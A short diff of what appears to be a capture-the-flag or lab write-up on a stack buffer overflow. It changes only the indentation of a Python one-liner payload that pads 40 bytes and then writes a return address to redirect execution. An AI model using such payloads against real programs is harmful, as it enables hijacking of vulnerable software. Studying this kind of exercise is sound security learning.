@@ -128,8 +128,7 @@ main function. so we need overwite the value of  $rbp   we need to add 8 more bi
 
 
 ## exploit 
-
-	python -c 'print "A"*40 + "\xce\x11\x40\x00\x00\x00\x00\x00"
+python -c 'print "A"*40 + "\xce\x11\x40\x00\x00\x00\x00\x00"
 
 
 
